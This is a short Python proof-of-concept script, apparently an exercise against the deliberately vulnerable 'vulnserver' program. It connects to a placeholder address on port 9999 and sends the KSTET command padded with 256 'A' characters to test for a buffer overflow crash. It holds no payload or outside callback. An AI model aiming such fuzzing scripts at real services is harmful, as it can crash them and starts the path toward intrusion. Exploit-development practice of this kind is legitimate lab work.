import sys
import socket


# Fuzzing/poc vulnserver

evilString = "A" * 256

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + evilString

s.connect(('xxx.xxx.xxx.xxx', 9999))
s.recv(1024)
s.send(command2)
s.close()
